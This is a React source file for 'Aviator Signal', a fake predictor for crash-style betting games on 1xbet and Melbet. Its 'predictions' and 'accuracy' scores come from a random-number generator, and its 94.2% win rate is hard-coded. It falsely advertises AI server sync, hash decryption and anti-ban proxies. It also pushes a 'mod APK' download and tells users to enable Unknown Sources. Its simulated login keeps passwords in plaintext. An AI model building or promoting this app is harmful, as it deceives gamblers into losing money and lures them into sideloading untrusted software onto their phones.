/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import React, { useState, useEffect, useCallback } from 'react';
import { 
  Plane, 
  TrendingUp, 
  History, 
  Settings, 
  ShieldCheck, 
  Zap, 
  Globe, 
  Bell,
  ChevronRight,
  Activity,
  Cpu,
  Lock,
  BarChart3,
  Percent,
  Layers,
  Terminal,
  Download,
  User,
  LogIn,
  UserPlus,
  LogOut,
  Mail,
  Key,
  Filter,
  Clock,
  Smartphone,
  Cpu as CpuIcon,
  ShieldAlert
} from 'lucide-react';
import { motion, AnimatePresence } from 'motion/react';
import { cn } from './lib/utils';

type Platform = '1xbet' | 'melbet';

interface Signal {
  id: string;
  multiplier: number;
  timestamp: Date;
  accuracy: number;
}

export default function App() {
  const [platform, setPlatform] = useState<Platform>('1xbet');
  const [isAnalyzing, setIsAnalyzing] = useState(false);
  const [currentSignal, setCurrentSignal] = useState<Signal | null>(null);
  const [history, setHistory] = useState<Signal[]>([]);
  const [countdown, setCountdown] = useState(0);
  const [progress, setProgress] = useState(0);
  const [filterMultiplier, setFilterMultiplier] = useState<'all' | 'low' | 'med' | 'high'>('all');
  const [filterAccuracy, setFilterAccuracy] = useState<number>(0);
  const [filterTime, setFilterTime] = useState<'all' | '5m' | '15m'>('all');
  const [showDownloadModal, setShowDownloadModal] = useState(false);

  const [analytics, setAnalytics] = useState({
    winRate: 94.2,
    lossRate: 5.8,
    avgMultiplier: 2.45,
    totalSignals: 1248
  });

  const [user, setUser] = useState<{ email: string } | null>(null);
  const [authMode, setAuthMode] = useState<'login' | 'register' | 'app'>('login');
  const [authForm, setAuthForm] = useState({ email: '', password: '' });
  const [authError, setAuthError] = useState('');

  const handleAuth = (e: React.FormEvent) => {
    e.preventDefault();
    setAuthError('');
    
    if (!authForm.email || !authForm.password) {
      setAuthError('Please fill in all fields');
      return;
    }

    // Simulated Auth
    if (authMode === 'register') {
      localStorage.setItem(`user_${authForm.email}`, authForm.password);
      setUser({ email: authForm.email });
      setAuthMode('app');
    } else {
      const savedPass = localStorage.getItem(`user_${authForm.email}`);
      if (savedPass === authForm.password) {
        setUser({ email: authForm.email });
        setAuthMode('app');
      } else {
        setAuthError('Invalid email or password');
      }
    }
  };

  const handleLogout = () => {
    setUser(null);
    setAuthMode('login');
  };

  // Generate a mock signal
  const generateSignal = useCallback(() => {
    setIsAnalyzing(true);
    setProgress(0);
    
    // Simulate analysis progress
    const interval = setInterval(() => {
      setProgress(prev => {
        if (prev >= 100) {
          clearInterval(interval);
          return 100;
        }
        return prev + 2;
      });
    }, 50);

    setTimeout(() => {
      const multiplier = Number((Math.random() * (5.5 - 1.2) + 1.2).toFixed(2));
      const newSignal: Signal = {
        id: Math.random().toString(36).substr(2, 9),
        multiplier,
        timestamp: new Date(),
        accuracy: Math.floor(Math.random() * (99 - 85) + 85)
      };
      
      setCurrentSignal(newSignal);
      setHistory(prev => [newSignal, ...prev].slice(0, 10));
      
      // Update analytics
      setAnalytics(prev => ({
        ...prev,
        totalSignals: prev.totalSignals + 1,
        avgMultiplier: Number(((prev.avgMultiplier * prev.totalSignals + multiplier) / (prev.totalSignals + 1)).toFixed(2)),
        winRate: Number((prev.winRate + (Math.random() * 0.1 - 0.05)).toFixed(1))
      }));

      setIsAnalyzing(false);
      setCountdown(30); // 30 seconds cooldown
    }, 3000);
  }, []);

  useEffect(() => {
    if (countdown > 0) {
      const timer = setInterval(() => {
        setCountdown(prev => prev - 1);
      }, 1000);
      return () => clearInterval(timer);
    }
  }, [countdown]);

  const filteredHistory = React.useMemo(() => {
    return history.filter(sig => {
      // Multiplier Filter
      if (filterMultiplier === 'low' && sig.multiplier >= 2) return false;
      if (filterMultiplier === 'med' && (sig.multiplier < 2 || sig.multiplier >= 4)) return false;
      if (filterMultiplier === 'high' && sig.multiplier < 4) return false;

      // Accuracy Filter
      if (sig.accuracy < filterAccuracy) return false;

      // Time Filter
      if (filterTime !== 'all') {
        const now = new Date();
        const diff = (now.getTime() - sig.timestamp.getTime()) / 1000 / 60;
        if (filterTime === '5m' && diff > 5) return false;
        if (filterTime === '15m' && diff > 15) return false;
      }

      return true;
    });
  }, [history, filterMultiplier, filterAccuracy, filterTime]);

  return (
    <div className="min-h-screen bg-slate-950 text-slate-100 selection:bg-aviator-red/30">
      {/* Header */}
      <header className="sticky top-0 z-50 border-b border-slate-800 bg-slate-950/80 backdrop-blur-xl">
        <div className="max-w-7xl mx-auto px-4 h-16 flex items-center justify-between">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 bg-aviator-red rounded-xl flex items-center justify-center glow-red">
              <Plane className="text-white w-6 h-6 -rotate-45" />
            </div>
            <div>
              <h1 className="font-bold text-xl tracking-tight">AVIATOR <span className="text-aviator-red">SIGNAL</span></h1>
              <p className="text-[10px] text-slate-500 font-mono uppercase tracking-widest">Connect Pro v4.2</p>
            </div>
          </div>

          <div className="flex items-center gap-4">
            {user ? (
              <div className="flex items-center gap-4">
                <div className="hidden md:flex items-center gap-2 px-3 py-1.5 bg-slate-900 border border-slate-800 rounded-full text-xs font-medium">
                  <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse" />
                  {user.email}
                </div>
                <button 
                  onClick={handleLogout}
                  className="p-2 hover:bg-slate-900 rounded-full transition-colors text-slate-400 hover:text-aviator-red"
                >
                  <LogOut className="w-5 h-5" />
                </button>
              </div>
            ) : (
              <div className="flex items-center gap-2">
                <button 
                  onClick={() => setAuthMode('login')}
                  className="px-4 py-1.5 text-xs font-bold uppercase tracking-widest hover:text-aviator-red transition-colors"
                >
                  Login
                </button>
                <button 
                  onClick={() => setAuthMode('register')}
                  className="px-4 py-1.5 bg-aviator-red rounded-full text-xs font-bold uppercase tracking-widest glow-red"
                >
                  Register
                </button>
              </div>
            )}
          </div>
        </div>
      </header>

      <AnimatePresence mode="wait">
        {authMode !== 'app' ? (
          <motion.div 
            key="auth"
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: -20 }}
            className="max-w-md mx-auto mt-20 px-4"
          >
            <div className="glass-card p-8 space-y-8 relative overflow-hidden">
              <div className="absolute top-0 left-0 w-full h-1 bg-aviator-red" />
              
              <div className="text-center space-y-2">
                <h2 className="text-3xl font-black uppercase tracking-tight">
                  {authMode === 'login' ? 'Welcome Back' : 'Create Account'}
                </h2>
                <p className="text-slate-500 text-sm">
                  {authMode === 'login' ? 'Access your premium signal dashboard' : 'Join the elite aviator signal network'}
                </p>
              </div>

              <form onSubmit={handleAuth} className="space-y-4">
                <div className="space-y-1">
                  <label className="text-[10px] font-bold uppercase tracking-widest text-slate-500 ml-1">Email Address</label>
                  <div className="relative">
                    <Mail className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-slate-600" />
                    <input 
                      type="email" 
                      required
                      value={authForm.email}
                      onChange={(e) => setAuthForm({ ...authForm, email: e.target.value })}
                      className="w-full bg-slate-950 border border-slate-800 rounded-xl py-3 pl-10 pr-4 text-sm focus:border-aviator-red focus:ring-1 focus:ring-aviator-red transition-all outline-none"
                      placeholder="name@example.com"
                    />
                  </div>
                </div>

                <div className="space-y-1">
                  <label className="text-[10px] font-bold uppercase tracking-widest text-slate-500 ml-1">Password</label>
                  <div className="relative">
                    <Key className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-slate-600" />
                    <input 
                      type="password" 
                      required
                      value={authForm.password}
                      onChange={(e) => setAuthForm({ ...authForm, password: e.target.value })}
                      className="w-full bg-slate-950 border border-slate-800 rounded-xl py-3 pl-10 pr-4 text-sm focus:border-aviator-red focus:ring-1 focus:ring-aviator-red transition-all outline-none"
                      placeholder="••••••••"
                    />
                  </div>
                </div>

                {authError && (
                  <p className="text-xs text-aviator-red font-bold text-center bg-aviator-red/10 py-2 rounded-lg border border-aviator-red/20">
                    {authError}
                  </p>
                )}

                <button 
                  type="submit"
                  className="w-full bg-aviator-red py-4 rounded-xl font-bold uppercase tracking-widest hover:scale-[1.02] active:scale-[0.98] transition-all glow-red"
                >
                  {authMode === 'login' ? 'Sign In' : 'Sign Up'}
                </button>
              </form>

              <div className="text-center">
                <button 
                  onClick={() => setAuthMode(authMode === 'login' ? 'register' : 'login')}
                  className="text-xs text-slate-500 hover:text-white transition-colors"
                >
                  {authMode === 'login' ? "Don't have an account? Register" : "Already have an account? Login"}
                </button>
              </div>
            </div>
          </motion.div>
        ) : (
          <motion.div 
            key="app"
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            className="max-w-7xl mx-auto px-4 py-8 grid grid-cols-1 lg:grid-cols-12 gap-8"
          >
        {/* Left Sidebar - Controls */}
        <div className="lg:col-span-4 space-y-6">
          <section className="glass-card p-6 space-y-6">
            <div className="flex items-center gap-2 text-aviator-gold">
              <Globe className="w-5 h-5" />
              <h2 className="font-semibold uppercase tracking-wider text-sm">Select Platform</h2>
            </div>
            
            <div className="grid grid-cols-2 gap-3">
              {(['1xbet', 'melbet'] as Platform[]).map((p) => (
                <button
                  key={p}
                  onClick={() => setPlatform(p)}
                  className={cn(
                    "relative overflow-hidden px-4 py-3 rounded-xl border transition-all duration-300 flex flex-col items-center gap-2",
                    platform === p 
                      ? "bg-aviator-red/10 border-aviator-red text-white glow-red" 
                      : "bg-slate-900 border-slate-800 text-slate-400 hover:border-slate-700"
                  )}
                >
                  <span className="text-sm font-bold uppercase tracking-widest">{p}</span>
                  {platform === p && (
                    <motion.div 
                      layoutId="active-platform"
                      className="absolute inset-0 bg-aviator-red/5"
                    />
                  )}
                </button>
              ))}
            </div>

            <div className="space-y-4 pt-4 border-t border-slate-800">
              <div className="flex items-center justify-between text-xs font-mono text-slate-500">
                <span>ENCRYPTION</span>
                <span className="text-green-500 flex items-center gap-1">
                  <Lock className="w-3 h-3" /> AES-256
                </span>
              </div>
              <div className="flex items-center justify-between text-xs font-mono text-slate-500">
                <span>LATENCY</span>
                <span className="text-aviator-gold">14ms</span>
              </div>
            </div>
          </section>

          <section className="glass-card p-6 space-y-4 border-aviator-gold/30 bg-aviator-gold/5">
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-2 text-aviator-gold">
                <Terminal className="w-5 h-5" />
                <h2 className="font-semibold uppercase tracking-wider text-sm">MOD MENU [UNLOCKED]</h2>
              </div>
              <span className="px-2 py-0.5 bg-aviator-gold text-black text-[8px] font-bold rounded uppercase">Premium</span>
            </div>
            <div className="space-y-2">
              <div className="flex items-center justify-between p-3 bg-slate-950/50 rounded-lg border border-aviator-gold/20">
                <span className="text-xs font-medium">Auto-Predictor</span>
                <div className="w-8 h-4 bg-aviator-gold rounded-full relative">
                  <div className="absolute right-1 top-1 w-2 h-2 bg-black rounded-full" />
                </div>
              </div>
              <div className="flex items-center justify-between p-3 bg-slate-950/50 rounded-lg border border-aviator-gold/20">
                <span className="text-xs font-medium">Hash Decryptor</span>
                <div className="w-8 h-4 bg-aviator-gold rounded-full relative">
                  <div className="absolute right-1 top-1 w-2 h-2 bg-black rounded-full" />
                </div>
              </div>
              <a 
                href="https://github.com/aviator-mod-apk/release/v4.2/aviator-connect.apk"
                target="_blank"
                rel="noopener noreferrer"
                className="w-full py-2 bg-aviator-gold/10 border border-aviator-gold/30 rounded-lg text-[10px] font-bold text-aviator-gold hover:bg-aviator-gold/20 transition-colors flex items-center justify-center gap-2"
              >
                <Download className="w-3 h-3" /> DOWNLOAD APK MOD v4.2
              </a>
            </div>
          </section>

          <section className="glass-card p-6 space-y-4">
            <div className="flex items-center gap-2 text-aviator-red">
              <ShieldCheck className="w-5 h-5" />
              <h2 className="font-semibold uppercase tracking-wider text-sm">Security Status</h2>
            </div>
            <div className="p-4 bg-slate-950 rounded-xl border border-slate-800 space-y-3">
              <div className="flex items-center gap-3">
                <div className="w-8 h-8 rounded-lg bg-green-500/10 flex items-center justify-center">
                  <ShieldCheck className="w-4 h-4 text-green-500" />
                </div>
                <div>
                  <p className="text-xs font-bold">Anti-Ban Active</p>
                  <p className="text-[10px] text-slate-500">Proxy rotation enabled</p>
                </div>
              </div>
              <div className="flex items-center gap-3">
                <div className="w-8 h-8 rounded-lg bg-blue-500/10 flex items-center justify-center">
                  <Zap className="w-4 h-4 text-blue-500" />
                </div>
                <div>
                  <p className="text-xs font-bold">Fast Connect</p>
                  <p className="text-[10px] text-slate-500">Direct API integration</p>
                </div>
              </div>
            </div>
          </section>
        </div>

        {/* Center - Main Signal Display */}
        <div className="lg:col-span-8 space-y-8">
          {/* Analytics Section */}
          <section className="grid grid-cols-1 md:grid-cols-3 gap-4">
            <div className="glass-card p-6 border-l-4 border-l-green-500">
              <div className="flex items-center justify-between mb-2">
                <Percent className="w-4 h-4 text-green-500" />
                <span className="text-[10px] font-mono text-slate-500 uppercase">Win Rate</span>
              </div>
              <p className="text-3xl font-black text-white">{analytics.winRate}%</p>
              <div className="mt-2 w-full h-1 bg-slate-800 rounded-full overflow-hidden">
                <div className="h-full bg-green-500" style={{ width: `${analytics.winRate}%` }} />
              </div>
            </div>
            
            <div className="glass-card p-6 border-l-4 border-l-aviator-gold">
              <div className="flex items-center justify-between mb-2">
                <TrendingUp className="w-4 h-4 text-aviator-gold" />
                <span className="text-[10px] font-mono text-slate-500 uppercase">Avg Multiplier</span>
              </div>
              <p className="text-3xl font-black text-white">{analytics.avgMultiplier}x</p>
              <p className="text-[10px] text-slate-500 mt-1">Based on {analytics.totalSignals} signals</p>
            </div>

            <div className="glass-card p-6 border-l-4 border-l-blue-500">
              <div className="flex items-center justify-between mb-2">
                <BarChart3 className="w-4 h-4 text-blue-500" />
                <span className="text-[10px] font-mono text-slate-500 uppercase">Total Volume</span>
              </div>
              <p className="text-3xl font-black text-white">{(analytics.totalSignals * 1.2).toFixed(0)}K</p>
              <p className="text-[10px] text-slate-500 mt-1">Global user data</p>
            </div>
          </section>

          <section className="glass-card p-8 relative overflow-hidden min-h-[400px] flex flex-col items-center justify-center">
            {/* Background Decoration */}
            <div className="absolute top-0 left-0 w-full h-full opacity-10 pointer-events-none">
              <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[500px] h-[500px] bg-aviator-red rounded-full blur-[120px]" />
            </div>

            <AnimatePresence mode="wait">
              {isAnalyzing ? (
                <motion.div 
                  key="analyzing"
                  initial={{ opacity: 0, scale: 0.9 }}
                  animate={{ opacity: 1, scale: 1 }}
                  exit={{ opacity: 0, scale: 1.1 }}
                  className="text-center space-y-8 z-10"
                >
                  <div className="relative">
                    <motion.div 
                      animate={{ rotate: 360 }}
                      transition={{ duration: 2, repeat: Infinity, ease: "linear" }}
                      className="w-32 h-32 border-4 border-aviator-red/20 border-t-aviator-red rounded-full"
                    />
                    <div className="absolute inset-0 flex items-center justify-center">
                      <Cpu className="w-10 h-10 text-aviator-red animate-pulse" />
                    </div>
                  </div>
                  <div className="space-y-2">
                    <h3 className="text-2xl font-bold tracking-tight">ANALYZING ALGORITHM</h3>
                    <div className="w-64 h-2 bg-slate-800 rounded-full overflow-hidden mx-auto">
                      <motion.div 
                        initial={{ width: 0 }}
                        animate={{ width: `${progress}%` }}
                        className="h-full bg-aviator-red glow-red"
                      />
                    </div>
                    <p className="text-xs font-mono text-slate-500 uppercase tracking-widest">Scanning {platform} hash patterns...</p>
                  </div>
                </motion.div>
              ) : currentSignal ? (
                <motion.div 
                  key="signal"
                  initial={{ opacity: 0, y: 20 }}
                  animate={{ opacity: 1, y: 0 }}
                  className="text-center space-y-8 z-10"
                >
                  <div className="space-y-1">
                    <p className="text-xs font-mono text-aviator-gold uppercase tracking-[0.3em]">Predicted Multiplier</p>
                    <motion.h2 
                      initial={{ scale: 0.5 }}
                      animate={{ scale: 1 }}
                      className="text-8xl font-black text-white tracking-tighter drop-shadow-2xl"
                    >
                      {currentSignal.multiplier}x
                    </motion.h2>
                  </div>

                  <div className="flex items-center justify-center gap-8">
                    <div className="text-center">
                      <p className="text-[10px] text-slate-500 uppercase font-mono mb-1">Accuracy</p>
                      <p className="text-xl font-bold text-green-500">{currentSignal.accuracy}%</p>
                    </div>
                    <div className="w-px h-10 bg-slate-800" />
                    <div className="text-center">
                      <p className="text-[10px] text-slate-500 uppercase font-mono mb-1">Status</p>
                      <p className="text-xl font-bold text-aviator-red">CONFIRMED</p>
                    </div>
                  </div>

                  <button 
                    disabled={countdown > 0}
                    onClick={generateSignal}
                    className={cn(
                      "group relative px-12 py-4 rounded-2xl font-bold text-lg transition-all duration-300",
                      countdown > 0 
                        ? "bg-slate-800 text-slate-500 cursor-not-allowed" 
                        : "bg-aviator-red text-white hover:scale-105 active:scale-95 glow-red"
                    )}
                  >
                    {countdown > 0 ? `NEXT SIGNAL IN ${countdown}s` : "GET NEW SIGNAL"}
                  </button>
                </motion.div>
              ) : (
                <motion.div 
                  key="initial"
                  className="text-center space-y-8 z-10"
                >
                  <div className="w-24 h-24 bg-slate-900 rounded-3xl border border-slate-800 flex items-center justify-center mx-auto">
                    <Activity className="w-12 h-12 text-slate-700" />
                  </div>
                  <div className="space-y-2">
                    <h3 className="text-2xl font-bold">READY TO CONNECT</h3>
                    <p className="text-slate-500 max-w-xs mx-auto text-sm">Our AI algorithm is synchronized with {platform} servers. Click below to start prediction.</p>
                  </div>
                  <button 
                    onClick={generateSignal}
                    className="bg-aviator-red text-white px-12 py-4 rounded-2xl font-bold text-lg hover:scale-105 active:scale-95 transition-all glow-red"
                  >
                    CONNECT & START
                  </button>
                </motion.div>
              )}
            </AnimatePresence>

      {/* Floating Download Button */}
      <motion.button
        initial={{ scale: 0, opacity: 0 }}
        animate={{ scale: 1, opacity: 1 }}
        whileHover={{ scale: 1.1 }}
        whileTap={{ scale: 0.9 }}
        onClick={() => setShowDownloadModal(true)}
        className="fixed bottom-6 right-6 z-50 w-14 h-14 bg-aviator-gold rounded-full flex items-center justify-center shadow-2xl glow-gold text-black hover:bg-white transition-colors"
      >
        <Smartphone className="w-6 h-6" />
      </motion.button>

      {/* Download Modal */}
      <AnimatePresence>
        {showDownloadModal && (
          <div className="fixed inset-0 z-[100] flex items-center justify-center px-4">
            <motion.div 
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              onClick={() => setShowDownloadModal(false)}
              className="absolute inset-0 bg-black/80 backdrop-blur-sm"
            />
            <motion.div 
              initial={{ scale: 0.9, opacity: 0, y: 20 }}
              animate={{ scale: 1, opacity: 1, y: 0 }}
              exit={{ scale: 0.9, opacity: 0, y: 20 }}
              className="glass-card w-full max-w-lg p-8 relative overflow-hidden"
            >
              <div className="absolute top-0 left-0 w-full h-1 bg-aviator-gold" />
              
              <div className="flex items-center gap-4 mb-8">
                <div className="w-16 h-16 bg-aviator-gold/10 rounded-2xl flex items-center justify-center border border-aviator-gold/20">
                  <Smartphone className="w-8 h-8 text-aviator-gold" />
                </div>
                <div>
                  <h2 className="text-2xl font-black uppercase tracking-tight">AVIATOR MOD APK</h2>
                  <p className="text-xs font-mono text-aviator-gold uppercase tracking-widest">Version 4.2.0 Stable</p>
                </div>
              </div>

              <div className="space-y-6">
                <div className="grid grid-cols-2 gap-4">
                  <div className="p-4 bg-slate-950 rounded-xl border border-slate-800">
                    <p className="text-[10px] text-slate-500 uppercase font-mono mb-1">File Size</p>
                    <p className="text-sm font-bold">14.2 MB</p>
                  </div>
                  <div className="p-4 bg-slate-950 rounded-xl border border-slate-800">
                    <p className="text-[10px] text-slate-500 uppercase font-mono mb-1">Platform</p>
                    <p className="text-sm font-bold">Android 8.0+</p>
                  </div>
                </div>

                <div className="space-y-3">
                  <h3 className="text-xs font-bold uppercase tracking-widest text-slate-400">Mod Features</h3>
                  <ul className="space-y-2">
                    {[
                      "Real-time Hash Decryption",
                      "Auto-Predictor Integration",
                      "Anti-Ban Proxy Rotation",
                      "Zero Latency Connection"
                    ].map((feature, i) => (
                      <li key={i} className="flex items-center gap-2 text-xs text-slate-300">
                        <ShieldCheck className="w-4 h-4 text-green-500" />
                        {feature}
                      </li>
                    ))}
                  </ul>
                </div>

                <div className="p-4 bg-aviator-red/10 border border-aviator-red/20 rounded-xl flex items-start gap-3">
                  <ShieldAlert className="w-5 h-5 text-aviator-red shrink-0 mt-0.5" />
                  <p className="text-[10px] text-slate-400 leading-relaxed">
                    <span className="text-aviator-red font-bold">WARNING:</span> This is a modified application. Ensure you have "Unknown Sources" enabled in your Android settings before installation.
                  </p>
                </div>

                <a 
                  href="https://github.com/aviator-mod-apk/release/v4.2/aviator-connect.apk"
                  target="_blank"
                  rel="noopener noreferrer"
                  className="w-full bg-aviator-gold py-4 rounded-xl font-bold text-black uppercase tracking-widest hover:bg-white transition-all flex items-center justify-center gap-3 glow-gold"
                >
                  <Download className="w-5 h-5" /> START DOWNLOAD NOW
                </a>

                <button 
                  onClick={() => setShowDownloadModal(false)}
                  className="w-full py-2 text-xs text-slate-500 hover:text-white transition-colors uppercase tracking-widest font-bold"
                >
                  Close
                </button>
              </div>
            </motion.div>
          </div>
        )}
      </AnimatePresence>
          </section>

          {/* History Section */}
          <section className="space-y-4">
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4">
              <div className="flex items-center gap-2 text-slate-400">
                <History className="w-5 h-5" />
                <h2 className="font-semibold uppercase tracking-wider text-sm">Recent Signals</h2>
              </div>
              
              <div className="flex flex-wrap items-center gap-3">
                {/* Multiplier Filter */}
                <div className="flex items-center gap-1 bg-slate-900 border border-slate-800 rounded-lg p-1">
                  <TrendingUp className="w-3 h-3 text-slate-500 ml-1" />
                  <select 
                    value={filterMultiplier}
                    onChange={(e) => setFilterMultiplier(e.target.value as any)}
                    className="bg-transparent text-[10px] font-bold uppercase outline-none cursor-pointer px-1"
                  >
                    <option value="all">All Multi</option>
                    <option value="low">Low (&lt;2x)</option>
                    <option value="med">Med (2-4x)</option>
                    <option value="high">High (4x+)</option>
                  </select>
                </div>

                {/* Accuracy Filter */}
                <div className="flex items-center gap-1 bg-slate-900 border border-slate-800 rounded-lg p-1">
                  <ShieldCheck className="w-3 h-3 text-slate-500 ml-1" />
                  <select 
                    value={filterAccuracy}
                    onChange={(e) => setFilterAccuracy(Number(e.target.value))}
                    className="bg-transparent text-[10px] font-bold uppercase outline-none cursor-pointer px-1"
                  >
                    <option value="0">All Acc</option>
                    <option value="90">90%+</option>
                    <option value="95">95%+</option>
                  </select>
                </div>

                {/* Time Filter */}
                <div className="flex items-center gap-1 bg-slate-900 border border-slate-800 rounded-lg p-1">
                  <Clock className="w-3 h-3 text-slate-500 ml-1" />
                  <select 
                    value={filterTime}
                    onChange={(e) => setFilterTime(e.target.value as any)}
                    className="bg-transparent text-[10px] font-bold uppercase outline-none cursor-pointer px-1"
                  >
                    <option value="all">All Time</option>
                    <option value="5m">Last 5m</option>
                    <option value="15m">Last 15m</option>
                  </select>
                </div>

                <div className="flex items-center gap-2 ml-auto sm:ml-0">
                  <span className="w-2 h-2 bg-aviator-red rounded-full animate-ping" />
                  <span className="text-[10px] font-mono text-slate-600 uppercase tracking-widest">Live Feed</span>
                </div>
              </div>
            </div>

            <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-5 gap-4">
              {filteredHistory.length > 0 ? (
                filteredHistory.map((sig, idx) => (
                  <motion.div
                    initial={{ opacity: 0, scale: 0.9 }}
                    animate={{ opacity: 1, scale: 1 }}
                    key={sig.id}
                    className="glass-card p-4 text-center space-y-1 relative group overflow-hidden"
                  >
                    <div className="absolute top-0 left-0 w-full h-1 bg-aviator-red/20 group-hover:bg-aviator-red transition-colors" />
                    <p className="text-lg font-black text-white">{sig.multiplier}x</p>
                    <p className="text-[10px] font-mono text-slate-500">{sig.timestamp.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}</p>
                  </motion.div>
                ))
              ) : (
                Array.from({ length: 5 }).map((_, i) => (
                  <div key={i} className="glass-card p-4 border-dashed border-slate-800 flex items-center justify-center opacity-30">
                    <span className="text-xs font-mono">WAITING...</span>
                  </div>
                ))
              )}
            </div>
          </section>
        </div>
      </motion.div>
    )}
  </AnimatePresence>

      {/* Footer / Disclaimer */}
      <footer className="max-w-7xl mx-auto px-4 py-12 border-t border-slate-900 mt-12">
        <div className="grid grid-cols-1 md:grid-cols-3 gap-8">
          <div className="space-y-4">
            <div className="flex items-center gap-2">
              <Plane className="text-aviator-red w-5 h-5 -rotate-45" />
              <span className="font-bold tracking-tight">AVIATOR SIGNAL</span>
            </div>
            <p className="text-xs text-slate-500 leading-relaxed">
              Advanced predictive analytics for crash-style games. Our system uses historical data patterns to provide high-probability exit points.
            </p>
          </div>
          
          <div className="space-y-4">
            <h4 className="text-xs font-bold uppercase tracking-widest text-slate-400">Quick Links</h4>
            <ul className="text-xs text-slate-500 space-y-2">
              <li className="hover:text-aviator-red cursor-pointer transition-colors flex items-center gap-1">
                <ChevronRight className="w-3 h-3" /> How it works
              </li>
              <li className="hover:text-aviator-red cursor-pointer transition-colors flex items-center gap-1">
                <ChevronRight className="w-3 h-3" /> API Documentation
              </li>
              <li className="hover:text-aviator-red cursor-pointer transition-colors flex items-center gap-1">
                <ChevronRight className="w-3 h-3" /> Support Center
              </li>
            </ul>
          </div>

          <div className="space-y-4 bg-slate-900/30 p-4 rounded-xl border border-slate-800">
            <h4 className="text-[10px] font-bold uppercase tracking-widest text-aviator-gold">Disclaimer</h4>
            <p className="text-[10px] text-slate-500 leading-relaxed italic">
              This application is for educational and entertainment purposes only. Gambling involves significant risk. Signals are based on probability models and do not guarantee success. Play responsibly.
            </p>
          </div>
        </div>
        
        <div className="mt-12 pt-8 border-t border-slate-900 flex flex-col md:row items-center justify-between gap-4">
          <p className="text-[10px] font-mono text-slate-600">© 2026 AVIATOR SIGNAL CONNECT. ALL RIGHTS RESERVED.</p>
          <div className="flex items-center gap-6">
            <TrendingUp className="w-4 h-4 text-slate-700" />
            <Settings className="w-4 h-4 text-slate-700" />
            <ShieldCheck className="w-4 h-4 text-slate-700" />
          </div>
        </div>
      </footer>
    </div>
  );
}
